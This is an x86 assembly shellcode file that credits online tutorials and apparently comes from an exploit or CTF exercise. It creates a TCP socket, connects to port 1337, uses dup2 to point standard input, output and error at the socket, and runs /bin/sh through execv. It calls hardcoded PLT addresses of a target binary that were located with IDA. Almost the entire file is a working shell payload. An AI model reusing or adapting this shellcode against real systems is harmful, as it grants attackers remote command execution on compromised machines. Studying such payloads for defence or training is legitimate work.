#credit: https://stackoverflow.com/questions/26892068/linux-x86-64-assembly-socket-programming
#credits\: https://www.abatchy.com/2017/05/tcp-bind-shell-in-assembly-null
#credit: https://gist.github.com/geyslan/5174296

#same flow as shell_in_cli.c (it works there :) )
xor edx, edx
mov edx, 1 #for debug purpose, if edx == 1 we start the shellcode

_socket:
    push    0x06                # push 6 onto the stack (IPPROTO_TCP)
    push    0x01                # push 1 onto the stack (SOCK_STREAM)
    push    0x02                # push 2 onto the stack (PF_INET)
    mov     ecx, esp            # move address of arguments into ecx
    mov     edi, 0x08048730     #by ida this is the plt address of socket()
    call    edi
    mov     esi, eax            #save the socket in esi
    

_sockaddr_in:                   #create the struct in stack
    xor edx, edx
    push edx                    #sockaddr.sin_addr.s_addr: INADDR_ANY = 0
    push 0x3905                 #sockaddr.sin_port , PORT = 1337 (big endian) 
    mov ebx, 2                  
    push bx                     #sockaddr.sin_family , AF_INET = 2
    mov ecx, esp                #ECX holds pointer to struct sockaddr  

    
_connect:
    
    push 0x10                   #sizeof sockaddr_in, it's what written in the site I linked above
    push ecx                    #pointer to sockaddr_in
    push esi                    #push socket for connect
    mov ecx, esp                #move address of arguments into ecx
    mov edi, 0x08048750         #by ida this is the plt address of connect()
    call edi
    
    
    mov ecx, 3                  #count fo the loop, also use in dup2
_dup2:
    dec ecx
    push ecx                    #stderr == 2, stdout == 1, stdin == 0
    push esi                    #push socket for dup2
    mov edi, 0x08048600         #by ida this is the plt address of dup2()
    call edi
    test ecx, ecx               #check if ecx == 0
    jne _dup2
    
    
_execv:
    xor edx, edx
    push edx                    #null byte to "/bin/sh"
    push 0x68732f2f             #"/sh"       
    push 0x6e69622f             #"/bin"
    mov esi, esp                #pointer to string "/bin/sh"
    push edx                    #push null, second argument for execv
    push esi                    #push pointer
    mov  ecx, esp               #move address of arguments into ecx
    mov edi, 0x080486d0         #by ida this is the plt address of execv()
    call edi
    
#finish, wooooooooow

